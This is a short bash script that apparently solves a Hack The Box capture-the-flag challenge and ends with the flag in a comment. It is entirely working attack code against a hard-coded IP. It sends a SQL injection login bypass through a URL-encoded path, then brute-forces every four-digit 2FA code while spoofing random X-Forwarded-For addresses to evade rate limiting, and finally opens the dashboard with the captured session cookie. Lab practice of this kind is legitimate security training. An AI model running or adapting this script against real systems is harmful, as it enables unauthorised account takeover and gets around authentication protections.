#!/bin/bash

ip="167.99.85.216:32237"

curl -X POST -d "username=admin' OR 1==1;--&password=x" "http://${ip}/%2fauth/login"

for code in {0000..9999}; do
    random_ip=$(printf "%d.%d.%d.%d\n" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))")

    response=$(curl -s -o /dev/null -c cookies.txt -w "%{http_code}" -X POST -d "2fa-code=${code}" -H "X-Forwarded-For: ${random_ip}"  "http://${ip}/auth/verify-2fa")

    if [ "${response}" -eq 302 ]; then
        echo "302 Found for code ${code}."
	curl -b cookies.txt "http://${ip}/dashboard"
	break
    elif [ "${response}" -eq 400 ]; then
        echo "Code ${code} resulted in 400 Bad Request."
    else
        echo "Code found: ${code}"
    fi
done

#HTB{1_l0v3_h4pr0x1_4cl5_4nd_4ll_1t5_f34tur35}
